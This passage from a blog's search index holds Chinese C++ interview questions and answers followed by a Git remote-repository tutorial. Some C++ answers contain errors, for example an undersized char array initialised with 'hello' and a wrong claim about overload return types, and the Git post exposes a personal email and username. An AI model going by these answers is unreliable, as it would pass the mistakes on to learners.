基类与派生类的对象，指针或引用之间，哪些情况下可以隐含转换，哪些情况下可以显 示转换？在涉及多重继承或虚继承的情况下，在转换时会面临哪些新问题？<br>派生类指针可以隐含转换为基类指针，而基类指针要想转换为派生类指针，则转换一定 要显示地进行。因为从特殊的指针转换到一般的指针时安全的，因此允许隐含转换；<br>从一般 的指针转换到特殊的指针是不安全的，因此只能显示地转换。基类对象一般无法被显式转换 为派生类对象。在多重继承情况下，执行基类指针到派生类指针的显式转换时，有时需要将 指针所存储的地址值进行调整后才能得到新指针的值。<br>但是，如果 A 类型是 B 类型的虚拟 基类，虽然 B 类型的指针可以隐含转换为 A 类型，但是 A 类型指针却无法通过 static_case 隐含转换为 B 类型的指针。</p><p>16 什么叫做多态性？在 C++种是如何实现多态的？<br><strong>多态是指同样的消息被不同类型的对象接收时导致完全不同的行为，是对类的特定成员 函数的再抽象。</strong>C++支持重载多态，强制多态，包含多态和参数多态。 在基类中声明相应的函数为 virtual 型，然后在派生类中实现该函数，这样就可以通过 基类指针调用派生类对象的函数，实现了运行时动态绑定，即多态的功能。</p><p>17 什么叫抽象类？抽象类有何作用？抽象类的派生类是否一定要给出纯虚函数的实现？<br>带有纯虚函数的类是抽象类。其主要作用是通过它为一个类族建立一个公共的接口，使 他们能够更有效地发挥多态特性。抽象类声明了一个类族派生类的共同接口，而接口的完整 实现，即纯虚函数的函数体，要由派生类自己定义。抽象类派生出新的类之后，如果派生类 给出所有纯虚函数的函数实现，这个派生类就可以定义自己的对象，因而不再是抽象类；反 之，如果派生类没有给出全部纯虚函数的实现，此时的派生类仍然是一个抽象类。</p><p>18 在 C++中，能否声明虚构造函数？为什么？能否声明虚析构函数？有何用途？<br>在 C++中，不能声明虚构造函数，多态是不同的对象对同一消息有不同的行为特性，虚 函数作为运行过程中多态的基础，主要是针对对象的，而构造函数是在对象产生之前运行的， 因此虚构造函数是没有意义的；<br>可以声明虚析构函数，析构函数的功能是在该类对象消亡之前进行一些必要的清理工作， 如果一个类的析构函数是虚函数，那么，由它派生而来的所有子类的析构函数也是虚函数。 析构函数设置为虚函数之后，在使用指针引用时可以动态联编，实现运行时的多态，保证使 用基类的指针就能够调用适当的析构函数针对不同的对象进行清理工作。</p><p>19 什么叫做流？流的提取和插入是指什么？I/O 流在 C++中起着怎样的作用？<br>流是一种抽象，它 负责在数据的生产者和数据的消费者之间建立联系，并管理数据的流 动，一般意义下的读操作在流数据抽象中被称为（从流中）提取，写操作被称为（向流中） 插入。<br>操作系统是将键盘、屏幕、打印机和通信端口作为扩充文件来处理的，I/O 流类就是 用来与这些扩充文件进行交互，实现数据的输入与输出。</p><p>20 什么叫做异常？什么叫做异常处理？<br>当一个函数在执行的过程中出现了一些不平常的情况，或运行结果无法定义的情况，使 得操作不得不被中断时，我们说出现了异常。异常通常是用 throw 关键字产生的一个对象， 用来表明出现了一些意外的情况。我们在设计程序时，就要充分考虑到各种意外情况，并给 与恰当的处理。这就是我们所说的异常处理。</p><p>21 C++的异常处理机制有何优点？<br>C++的异常处理机制使得异常的引发和处理不必在同一函数中，这样底层的函数可以着 重解决具体问题，而不必过多地考虑对异常的处理。上层调用者可以在适当的位置设计对不 同类型异常的处理。</p><p>22 比较函数重载和虚函数在概念和使用方式方面有什么区别？<br>    函数重载可以用于普通函数（非成员的函数）和类的成员函数，而虚函数只能用于 类的成员函数。<br>    函数重载可以用于构造函数，而虚函数不能用于构造函数。<br>    如果对成员函数进行重载，则重载的函数与被重载的函数应当都是同一类中的成员 函数，不能分属于两个不同继承层次的类。函数重载是横向的重载。虚函数是对同 一类族中的基类和派生类的同名函数的处理，即允许在派生类中对基类的成员函数 重新定义。虚函数的作用是处理纵向的同名函数。<br>    重载的函数必须具有相同的函数名，但函数的参数个数和参数类型二者中至少有一 样不同，否则在编译时无法区分它们。而虚函数则要求再同一类族中的所有虚函数 不仅函数名相同，而且要求函数类型、函数的参数个数和参数类型都全部相同，否 则就不是重定义了。也就不是虚函数了。<br>    函数重载是在程序编译阶段确定操作的对象的，属静态关联。虚函数是在程序运行 阶段确定操作的对象的，属动态关联。</p><p>23 比较 class 和 struct 结构体的异同<br>不同之处：</p><pre><code class="hljs">默认成员访问权限不同，struct 默认是 public，而 class 默认是 private。默认继承方式不同，struct 默认是 public，而 class 默认是 private。在定义模板参数时可以用 class 但不能用 struct。 相同之处在于：都可以包含成员函数，都可以实现继承，都可以实现多态。</code></pre><p>24 浅拷贝和深拷贝的区别？<br>在某些情况下，类内的成员变量需要动态开辟堆内存，如果实行按位拷贝，就可能会出 现两个对象里面的成员变量指针指向同一块内存区域。当回收其中一个对象时，该对象成员 变量所指向的内存区域也将回收，会导致另一个对象存在野指针的情况。非常危险。 深拷贝和浅拷贝可以简单理解为：如果一个类拥有资源，当这个类的对象发生复制过程 的时候，资源重新分配，这个过程就是深拷贝，反之，没有重新分配资源，就是浅拷贝。</p><p>25 const 和 static 作用 const 作用：<br>const:</p><pre><code class="hljs">定义 const 常量，具有不可变性，保护被修饰的东西。防止意外修改，增强程序的 健壮性。便于类型检查，使编译器对处理内容有更多的了解。可以避免意义模糊的数字出现，也便于进行参数的修改。同宏定义一样，可以做到 不变则以，一变都变。const 定义的常量在程序运行过程中只有一份拷贝，而宏定义却又若干份拷贝。</code></pre><p>static:</p><pre><code class="hljs">作为类的静态数据成员：被类的所有对象共同拥有，在内存中只有一份拷贝。在类 内声明，在类外初始化。在全局变量前加上 static 关键字，该变量被定义为一个全局变量，特点：a) 变量在全局数据区分配内存b) 如果不显示初始化，则隐式的初始化为 0c) 作用域仅限于本文件内在局部变量前加 static 关键字，该变量被定义为静态局部变量，特点：a) 在全局数据区分配内存b) 如果不显示初始化，则隐式的初始化为 0c) 始终驻留在全局数据区，直到程序结束。作用域仅限于函数体内，当函数执行 完后作用域随之消失。静态函数，特点：a) 静态函数只能在本源文件中使用b) 在文件作用域下声明的 inline 函数默认是 static 的</code></pre><p>26 析构函数带 virtual 和 不带 virtual 的区别<br>如果基类要被派生，则析构函数一定要带 virtual。否则，通过基类指针指向派生类对象 后，删除该指针时并不会释放派生类对象的空间。也即，不会调用派生类的析构函数。</p><p>不带 virtual 的几种情况：</p><pre><code class="hljs">作为非公有基类不作为接口使用的基类可以保证这个类不被 public 继承如果他的所有派生类的 virtual 函数都是什么都不做如果不需要基类指针指向派生类对象</code></pre><p>27 重写，重载和隐藏的区别？<br>重载：在一个类中的同名函数，但参数列表不同，函数的返回值相同。<br>隐藏：派生类的函数屏蔽了与其同名的父类函数<br>重写（覆盖）：父类和子类存在相同的函数，包括返回值，参数列表均相同，父类的该 函数必须含有 virtual 关键字。</p><p>28 C++中的四个默认的函数<br>    构造函数：先基类后派生类<br>    拷贝函数：对象被创建时调用<br>    调用拷贝构造函数的情况：<br>    a) 一个对象以值传递的方式传入函数体<br>    b) 一个对象以值传递的方式从函数返回<br>    c) 一个对象需要通过另外一个对象初始化<br>    析构函数：每个类只有一个析构函数，<br>    赋值函数：</p><p>29 不可以被重载的运算符–五个<br>类属关系运算符、成员指针运算符“、作用域运算符、 sizeof 运算符和三目 运算符<br>. .* :: sizeof() ?:</p><p>30 三种字符数组初始化的方法<br>char str[5] = {“hello”};<br>char str[6] = {‘a’,‘b’,‘c’,‘d’,‘e’,’\0’};<br>char str[] = “abcde”;</p><p>31 哪些操作符必须重载为成员函数<br>必须重载：<br>= -&gt; () [] new delete</p><p>32 什么是“else 摇摆问题”，举例说明<br>C++编译器总是把 else 同与它最近的 if 联系起来，因此如果没有正确放置花括号对就 会出现逻辑错误。</p><p>33 函数模板和函数重载的区别与联系<br>函数重载：C++允许使用同一个函数名，不同的参数个数和参数类型来定义多个函数。 重载函数的参数个数，类型，顺序至少有一个不同。返回值可以相同，也可以不同。</p><p>函数模板：是对一类同构函数的抽象定义，并不是具体的函数，函数模板的定义被编译 时不会产生任何可执行的代码。 联系： 针对不同类型的数据，但实现相同功能的函数重载可以通过函数模板来替代。</p><p>34 怎样区别虚函数和纯虚函数？两者都有什么作用<br>纯虚函数是在基类中声明的虚函数，在基类中没有定义。在基类中实现纯虚函数的方法 是在函数原型后加“=0。虚函数可以实现也可以不实现。<br>定义纯虚函数是为了实现一个接口，起到了一个规范的作用。规范继承这个类的程序员 必须实现这个接口。<br>声明了纯虚函数的类为抽象类，不能实例化对象。 定义虚函数是为了允许用基类的指针来调用子类的这个函数。<br>抽象类的作用：将有关的操作作为一个接口组织在一个继承层次结构中，由他来为派生 类提供一个公共的根。派生类将具体实现在其基类中作为接口的操作。</p><p>35 面向对象程序“接口与实现方法分离”，有什么作用（好处）<br>接口与实现分离技术可以只把接口暴露给用户，具体的实现细节隐藏起来，当需要改动 代码时，只要在实现部分修改后编译，用户无需再编译自己的项目。</p><p>36 列出所有与字符串处理有关的头文件<br>string.h 是 C 语言中字符串操作函数的头文件<br>cstring 是 c++对 C 语言中的 strcpy 之类的函数申明，包含 cstring 之后，就可以在程序 中使用 C 语言风格的 strcpy 之类的函数。<br>string 是 c++语言中 string 类模板的申明<br>CString 是 MFC 中定义的字符串类，MFC 中很多类及函数都是以 CString 为参数的</p><p>37 C++中显示类型转换<br>    static_cast：最常用的类型转换，提供基本数据类型之间的转换操作。<br>    const_cast：可以把 const 类型的指针转换为非 const 类型的指针。<br>    reinterpret_cast：解释的意思，主要用于不相关类型之间的转换。目标和原始值之 间至少有相同的位数，我们可以将转换之后的值再转换回去，而不像其它 3 种类型 可能会导致精度丢失<br>    dynamic_cast：运行时检查该转换是否类型安全，但只有在多态类型时合法，主要 用于类层次间的上行和下行转换，还可以用于类之间的交叉转换。在进行类层次间 的上行转换时和 static_cast 效果一样，进行下行转换时，具有类型检查的功能，比 static_cast 更安全。</p><p>38 delete 和 delete [] 的区别？<br>delete ptr 代表用来释放内存，且只用来释放 ptr 指向的内存。<br>delete[] rg 用来释放 rg 指向的内存！！还逐一调用数组中每个对象的析构函数 对于像 int/char/long/int*/struct 等等简单数据类型，由于对象没有 destructor，所以用 delete 和 delete [] 是一样的！但是如果是 C++对象数组就不同了！</p><p>39 存储类别说明符可划分为两类。<br>静态存储类别（static，extern）和自动存储类别（auto， register）。这样的变量在程序执行进入到定义它们的程序块时创建，在程序块激活时存在， 在程序块退出时销毁。</p><p>40 什么是运算符重载，它如何增强 C++的扩展性？<br>运算符重载是对已有的运算符赋予多重含义，使得同一个运算符作用于不同类型的数据 时导致不同的行为。 运算符重载的本质是函数重载，可以改变现有运算符的操作方式，以适用于类类型，为 类的用户提供了一个直接的接口，使得用户程序所用的语言是面向问题的，而不是面向机器的，增强了 C++的扩展性。</p><p>41 为什么说”继承是 C++面向对象的主要特征之一”?请简要说明.？<br>继承是一种联结类的层次模型，层次结构的上层是最具有通用性的，而下层的部分，即 后代具有特殊性。类可以从他的祖先那里继承方法和成员变量，也可以增加新的方法是适用 于特殊的需要。如果没有继承，类就缺失了一块层次结构，代码重用和数据共享就贯彻不到 底，有了继承，就会有抽象编程中的多态问题，只有从机制内部真正解决了多态表现问题， 对象的数据封装，信息隐藏，代码重用等招式才能淋漓尽致的发挥出来。才称得上真正的面 向对象编程。</p><p>42 作用域辨析有哪些？<br>    类作用域： 在类的作用域内，类的成员可以被类的所有成员函数直接访问，在类的作用域之外， public 类成员通过对象的句柄之一而引用。句柄可以是对象名称，对象的引用，对象的指针。 对象，引用或指针指定了客户可访问的接口。<br>    全局名字空间作用域： 声明与任何函数或者类之外的标识符具有全局名字空间作用域，这种标识符对于从其声 明处开始直到文件结尾处为止出现的所有函数都是已知的，即可访问的。位于函数之外的全局变量。函数定义和函数原型都属于该作用域。<br>    函数作用域： 标签是唯一具有函数作用域的标识符，标签可以在函数中的任何地方使用，但是不能在 函数体外被引用。<br>    局部作用域： 在一个语句块中声明的作用域，开始于标识符的声明出，结束于标识符声明处所在语句 块的结束右花括号处。局部变量具有局部作用域，函数形参也是函数的局部作用域。当语句 块是嵌套的，并且外层语句块的一个标识符和内层语句块的一个标识符具有相同的名字时， 外层的标识符处于隐藏状态，直到内存的语句块执行结束为止。<br>    函数原型作用域： 函数原型形参列表中的标识符，在一个函数原型中，一个特定的标识符只能使用一次。</p><p>43.STL 是什么？组成部分和区别。<br>STL 是 c++提供的标准模板库。<br>STL 的主要组成部分为：容器、迭代器、算法、函数对象和适配器。其中算法处于核心 地位，迭代器如同算法和容器之间的桥梁，算法通过迭代器从容器中获取元素，然后将获取 的元素传递给特定的函数对象的操作，最后将处理后的结果存储到容器中。</p><p>44 如何声明和使用虚函数。说明它在多态性中的作用和意义。<br>声明：在基类中声明成员函数时在前面加上关键字 virtual 。<br>使用虚函数：在基类中将成员函数声明为虚函数，这样在派生类中重写该方法后，在使 用基类的指针或引用指向派生类对象时，就可以通过这个基类指针或引用访问到派生类的方法。</p><p>C++中的多态可分为四类：重载多态、强制多态、包含多态和参数多态，其中包含多态 是研究类族中定义于不同类中的同名函数的多态行为，主要通过虚函数来实现。多态使得接 口与实现得到分离，要利用统一接口实现运行时多态一般需要动态绑定，而虚函数是动态绑 定的基础，就使得虚函数在多态中很重要。</p><p>多态指同样的消息被不同类型的对象接收时导致不同的行为。 虚函数机理：当编译器看到 fn 的虚函数标志时，会记下，等遇到这个虚函数的调用时，将 该捆绑操作滞后到运行中，以实际的对象来捆绑其对应的成员函数操作，编译器在捆绑操作 b.fn()处避开函数调用，只作一个指向实际对象成员函数的间接访问，每个实际的对象都需 额外占有一个指针空间，以指向类中的虚函数表。</p><p>44.什么是逻辑错误？什么是语法错误？请举例说明。<br>逻辑错误：由于程序设计人员设计的算法有错或编写的程序有错，此时程序一般能够正 常运行，但是通知给系统的指令与解题的原意不相同，即出现了逻辑上的混乱。 例如：int a[5] = { 1 , 2 , 3 , 4 , 5} ; for( int i = 0 ; i &lt;= 0 ; i ++ ) cout &lt;&lt; a[i] &lt;&lt; endl ; //发生数组越界</p><p>语法错误：违背了 C++语言的规定，不能生成可执行文件，主要是语句的结构或拼写中 存在的错误。 例如：for( int i = 0 , i &lt; 10 , i ++) { } //应该用“;</p><p>45 编写语句说明枚举类型是如何定义和使用的。<br>枚举类型的声明形式如下 enum 枚举类型名 { 变量值列表 } ;</p><p>例如： enum weekday{ sun , mon , tue , wed , thu , fri , sta } ; 变量定义：enum weekday a , b , c = tue ; //也可以省略 enum</p><pre><code class="hljs">枚举元素具有默认值，他们依次是：0 , 1 , 2 , … , 例子中：sun 的值为 0 ， mon 的值 为 1，tue 的值为 2，… ,sta 的值为 6 。枚举元素按常量处理，不能进行赋值。整数值也不能赋给枚举变量，如确实需要可进行强制类型转换。枚举变量可以进行关系运算。</code></pre><p>46 ADT是什么？简述你对“数据抽象”和“信息隐藏”的认识。<br>C++内部的数据类型包括基本类型和复合类型（数组、字符串、指针和结构），有表示 范围，只是用可以接受的方式表示实际概念。确定了一个类型就确定了计算机存储给类型所 需要的容量，确定了其表示范围，也确定了对该类型可以进行的操作。</p><p>抽象数据类型（Abstract Data Type)，简称 ADT，是指一个数学模型以及定义在该模型 上的一组操作。 通常以以下格式定义： ADT 抽象数据类型名{ 数据对象：&lt;数据对象的定义&gt; 数据关系：&lt;数据关系的定义&gt; 基本操作：&lt;基本操作的定义&gt; }</p><p>数据抽象：对具体事物描述的一个概括。通过数据抽象可以将数据类型的定义和它的实 现分开，使得只研究和使用它的结构而不用考虑它的实现细节成为可能。C++中的类就是一 种数据抽象，类是具有相同属性和服务的一组对象的集合。</p><p>信息隐藏：C++中的封装就是信息隐藏的一种，即尽可能的隐藏对象的内部细节，对外 形成一个边界，只保留有限的对外接口使之与外部反生关系。</p><p>47 简述你对“面向对象”和“面向过程”编程思想的理解和认识。<br>“面向过程”是一种以事件为中心的编程思想，就是分析出解决问题所需要的步骤，然后 用函数把这些步骤一步一步实现，使用的时候一个一个依次调用就可以了。过程化编程强调 功能，以过程模块为中心，分层逐步展开设计。通常采用结构化程序设计，基本思路为：自 顶向下、逐步求精。</p><p>“面向对象”的编程思想就是把你需要解决的问题中的所有具体的东西，都看成一个个具 有属性和行为的对象，然后把所有具有相同性质的对象抽象成类，那些与问题无关的对象则 忽略。对象化编程强调分离抽象层次，以便让程序员分工，关心不同抽象层次中的细节，而 不用去关心不同抽象层次的联系，数据安全而隐蔽，不同抽象层次的职责分明。</p><p>50 写出递归函数定义以及相应的优缺点<br>递归函数是直接或间接地（通过另一个函数）调用自己。</p><p>优点：<br>结构清晰，可读性强，使程序易于理解和调试。</p><p>缺点</p><pre><code class="hljs">效率较低。递归是有时间和空间消耗的。另外，递归有可能很多计算都是重复的，从而给性能带来很大的负面影响。因为递归的本质是把一个问题分解成连个或者多个小问题。如果多个小问题存在相互重叠的部分，那么就存在重复的计算。可能导致调用栈溢出。每一次函数调用在内存栈中分配空间，而每个进程的栈的容量是有限的。当递归调用的层级太多时，就会超出栈的容量，从而导致栈溢出。</code></pre><p>51 写出包含输入输出的标准库<br>    <fstream><br>    <iomanip><br>    <ios><br>    <iosfwd><br>    <iostream><br>    <ostream><br>    <istream><br>    <sstream><br>    <streambuf></streambuf></sstream></istream></ostream></iostream></iosfwd></ios></iomanip></fstream></p><p>52 怎样区别虚函数和纯虚函数？两者都有什么作用<br>虛函數介紹</p><pre><code class="hljs">虚函数，在类成员方法的声明（不是定义）语句前加“virtual”, 如 virtual void func()纯虚函数，在虚函数后加“=0”，如 virtual void func()=0对于虚函数，子类可以（也可以不）重新定义基类的虚函数，该行为称之为复写Override。对于纯虚函数，子类必须提供纯虚函数的个性化实现。</code></pre><p>在派生子类中对虚函数和纯虚函数的个性化实现，都体现了“多态”特性。但区别是：</p><pre><code class="hljs">子类如果不提供虚函数的实现，将会自动调用基类的缺省虚函数实现，作为备选方案；子类如果不提供纯虚函数的实现，编译将会失败。尽管在基类中可以给出纯虚函数的实现，但无法通过指向子类对象的基类类型指针来调用该纯虚函数，也即不能作为子类相应纯虚函数的备选方案。（纯虚函数在基类中的实现跟多态性无关，它只是提供了一种语法上的便利，在变化多端的应用场景中留有后路。）</code></pre><p>虚函数：当使用类的指针调用成员函数时，普通函数由指针类型决定，而虚函数由指针指向的实际类型决定。所以虚函数的调用时由指针所指向内存块的具体类型决定的。</p><p>纯虚函数：纯虚函数是在基类中声明的虚函数，它要求任何派生类都要定义自己的实现方法，以实现多态性。实现了纯虚函数的子类，该纯虚函数在子类中就变成了虚函数。</p><p>定义纯虚函数是为了实现一个接口，用来规范派生类的行为，也即规范继承这个类的程序员必须实现这个函数。派生类仅仅只是继承函数的接口。纯虚函数的意义在于，让所有的类对象（主要是派生类对象）都可以执行纯虚函数的动作，但基类无法为纯虚函数提供一个合理的缺省实现。所以类纯虚函数的声明就是在告诉子类的设计者，“你必须提供一个纯虚函数的实现，但我不知道你会怎样实现它”。</p><p>含有纯虚函数的类称之为抽象类，它不能生成对象（创建实例），只能创建它的派生类的实例。抽象类是一种特殊的类，它是为了抽象和设计的目的为建立的，它处于继承层次结构的较上层。抽象类的主要作用是将有关的操作作为结果接口组织在一个继承层次结构中，由它来为派生类提供一个公共的根，派生类将具体实现在其基类中作为接口的操作。</p><p>抽象类只能作为基类来使用，其纯虚函数的实现由派生类给出。如果派生类中没有重新定义纯虚函数，而只是继承基类的纯虚函数，则这个派生类仍然还是一个抽象类。如果派生类中给出了基类纯虚函数的实现，则该派生类就不再是抽象类了，它是一个可以建立对象的具体的类。</p><hr><p>C++面试常见问题之美(转载)<br><a href="https://blog.51cto.com/u_15273495/2914522">https://blog.51cto.com/u_15273495/2914522</a></p>]]></content>
    
    
    <categories>
      
      <category>C++</category>
      
      <category>面试</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Git远程仓库</title>
    <link href="/project/2022/06/26/git%E8%BF%9C%E7%A8%8B%E4%BB%93%E5%BA%93/"/>
    <url>/project/2022/06/26/git%E8%BF%9C%E7%A8%8B%E4%BB%93%E5%BA%93/</url>
    
    <content type="html"><![CDATA[<h2 id="git远程仓库相关指令以及文件上传"><a href="#git远程仓库相关指令以及文件上传" class="headerlink" title="git远程仓库相关指令以及文件上传"></a>git远程仓库相关指令以及文件上传</h2><span id="more"></span><p>网址：<a href="https://github.com/">https://github.com</a></p><p>xxx账户：<a href="mailto:&#x34;&#x31;&#x39;&#51;&#x31;&#55;&#55;&#x36;&#x38;&#x40;&#113;&#x71;&#46;&#x63;&#111;&#x6d;">&#x34;&#x31;&#x39;&#51;&#x31;&#55;&#55;&#x36;&#x38;&#x40;&#113;&#x71;&#46;&#x63;&#111;&#x6d;</a>   用户名zxw0218，密码：一般密码</p><p>以将/d/gitproject/pycharm_python_and_pyqt中的文件同步到git中的zxw0218下的pycharm_python_and_pyqt为例</p><p>[TOC]</p><h2 id="查看分支状态"><a href="#查看分支状态" class="headerlink" title="查看分支状态"></a>查看分支状态</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">git status<br></code></pre></td></tr></table></figure><h2 id="创建版本库"><a href="#创建版本库" class="headerlink" title="创建版本库"></a>创建版本库</h2><p>git init 把当前的目录变成Git管理的版本库</p><p>git status 查看当前分支状态</p><p>git add . 把当前文件夹下的文件提交到暂存区</p><p>紧接着git commit -m “提交标签，如first proposed” 把暂存区提交到版本库</p><p>执行git status查看状态，确保工作区是干净的，没有需要提交的内容</p><p>（git log查看提交日志，git reflog查看提交版本号）</p><h2 id="远程同步"><a href="#远程同步" class="headerlink" title="远程同步"></a>远程同步</h2><p>git remote -v查看远程版本库信息</p><p>创建github上的git仓库，例如在github的zhzj0218下创建了仓库pycharm_python_and_pyqt.git</p><p>git remote add origin <a href="https://github.com/zhzj0218/pycharm_python_and_pyqt.git">https://github.com/zhzj0218/pycharm_python_and_pyqt.git</a></p><p>将本地仓库关联到Github仓库</p><p>再次查看git remote -v，确认远程仓库关联成功</p><p>git push -u origin master 将本地仓库的内容推送到Github仓库</p><h2 id="远程库克隆到本地"><a href="#远程库克隆到本地" class="headerlink" title="远程库克隆到本地"></a>远程库克隆到本地</h2><p>git clone <a href="https://github.com/zxw0218/pycharm_python_and_pyqt.git">https://github.com/zxw0218/pycharm_python_and_pyqt.git</a></p><p>将远程仓库的内容克隆到本地</p><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><h3 id="创建版本库-1"><a href="#创建版本库-1" class="headerlink" title="创建版本库"></a>创建版本库</h3><p>git clone <url> 克隆远程版本库到本地</url></p><p>git init 初始化本地版本库</p><h3 id="修改和提交gi"><a href="#修改和提交gi" class="headerlink" title="修改和提交gi"></a>修改和提交gi</h3><p>git status 查看状态，也可查看冲突的文件</p><p>git dif 查看变更内容</p><p>git add . 跟踪所有改动过的内容</p><p>git add <file> 跟踪制定的文件</file></p><p>git mv <old> <new> 文件改名</new></old></p><p>git rm <file> 删除文件</file></p><p>git rm –cached <file> 停止跟踪文件但不删除</file></p><p>git commit -m “commit message” 提交所有更新过的文件</p><p>git commit –amend 修改最后一次提交</p><h3 id="查看提交历史"><a href="#查看提交历史" class="headerlink" title="查看提交历史"></a>查看提交历史</h3><p>git log 查看提交历史</p><p>git log -p <file> 查看指定文件的提交历史</file></p><p>git blame <file> 以列表方式查看指定文件的提交历史</file></p><h3 id="撤销"><a href="#撤销" class="headerlink" title="撤销"></a>撤销</h3><p>git reset –hard HEAD 撤销工作目录中所有未提交文件的修改内容</p><p>git checkout HEAD <file> 撤销指定的未提交文件的修改内容</file></p><p>git revert <commit> 撤销指定的提交</commit></p><p>git reset –hard HEAD^ 还原到上一个版本</p><p>git reset –hard 18b6a 回到之前版本，此处18b6a为某个版本号，版本号无需写全</p><p>（git log查看提交历史，可看到版本号，git log –pretty=oneline可简化输出查看版本号，HEAD^表示上一次版本，HEAD^^表示上上一个版本，也可以用数字表示，HEAD~2，也可以用git reflog查看版本号，此时的版本号较短，为简短版本号）</p><p>git checkout – <file> 文件没有添加到暂存区时，撤回工作区的修改</file></p><p>git reset HEAD <file> 文件已经添加到暂存区时，撤销暂存区的修改，然后再使用git check – <file> 撤回工作区的修改</file></file></p><h3 id="分支与标签"><a href="#分支与标签" class="headerlink" title="分支与标签"></a>分支与标签</h3><p>git branch 显示所有本地分支</p><p>git checkout &lt;branch/tag&gt; 切换到指定分支或者标签</p><p>git branch <new-branch> 创建新分支</new-branch></p><p>git branch -d <branch> 删除本地分支</branch></p><p>git tag 列出所有本地标签</p><p>git tag <tagname>基于最新提交创建标签</tagname></p><p>git tag -d <tagname> 删除标签</tagname></p><h3 id="合并与衍合"><a href="#合并与衍合" class="headerlink" title="合并与衍合"></a>合并与衍合</h3><p>git merge <branch> 合并指定分支到当前分支</branch></p><p>git rebase <branch> 衍合指定分支到当前分支</branch></p><h3 id="远程操作"><a href="#远程操作" class="headerlink" title="远程操作"></a>远程操作</h3><p>git remote -v 查看远程版本库信息</p><p>git remote show <remote> 查看指定远程版本库信息</remote></p><p>git remote add <remote> <url> 添加远程版本库</url></remote></p><p>git fetch <remote> 从远程库获取代码</remote></p><p>git pull <remote> <branch> 下载代码及快速合并</branch></remote></p><p>git push <remote> <branch> 上传代码及快速合并</branch></remote></p><p>git push <remote>  :&lt;branch/tag-name&gt; 删除远程分支或标签</remote></p><p>git push –tags 上传所有标签</p><p>git remote rm origin移除原先错误的origin remote</p><h3 id="查看和修改用户名和邮箱"><a href="#查看和修改用户名和邮箱" class="headerlink" title="查看和修改用户名和邮箱"></a>查看和修改用户名和邮箱</h3><p>git config user.name查看用户名</p><p>git config user.email查看邮箱</p><p>git config –global user.name “your name”修改用户名为your name</p><p>git config –global user.email “your email”修改用户名为your email</p><h3 id="密码输入错误的解决方法"><a href="#密码输入错误的解决方法" class="headerlink" title="密码输入错误的解决方法"></a>密码输入错误的解决方法</h3><p>在控制面板，管理windows凭证，修改正确的密码</p><h3 id="大文件上传"><a href="#大文件上传" class="headerlink" title="大文件上传"></a>大文件上传</h3><p>git默认不能上传超过100M的文件，如果上传100M的文件，则会出现fatal: The remote end hung up unexpectedly的错误，表示存在大文件不能上传。因此需要处理大文件的上传。</p><p>示例：假设当前存在后缀为.exe，.zip及.whl的大文件，处理步骤如下：</p><p>git lfs install 安装lfs</p><p>git lfs track “*.zip”</p><p>git lfs track “*.exe”</p><p>git lfs track “*.whl”</p><p>则文件夹中生成的.gitattributes文件内容如下：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">*.exe <span class="hljs-attribute">filter</span>=lfs <span class="hljs-attribute">diff</span>=lfs <span class="hljs-attribute">merge</span>=lfs -text<br>*.zip <span class="hljs-attribute">filter</span>=lfs <span class="hljs-attribute">diff</span>=lfs <span class="hljs-attribute">merge</span>=lfs -text<br>*.whl <span class="hljs-attribute">filter</span>=lfs <span class="hljs-attribute">diff</span>=lfs <span class="hljs-attribute">merge</span>=lfs -text<br></code></pre></td></tr></table></figure><p>git add .gitattributes 将.gitattributes文件加入到暂存区</p><p>git commit -m “add lfs file” 提交文件</p><p>git push origin master 将本地仓库内容提交到Github仓库（包含大文件提交，提交的大文件具有lfs标签，表明为大文件）</p><p>参考资料</p><p><a href="https://www.cnblogs.com/gdjlc/p/12088872.html">https://www.cnblogs.com/gdjlc/p/12088872.html</a></p>]]></content>
    
    
    <categories>
      
      <category>Git</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Git</tag>
      
      <tag>指令</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
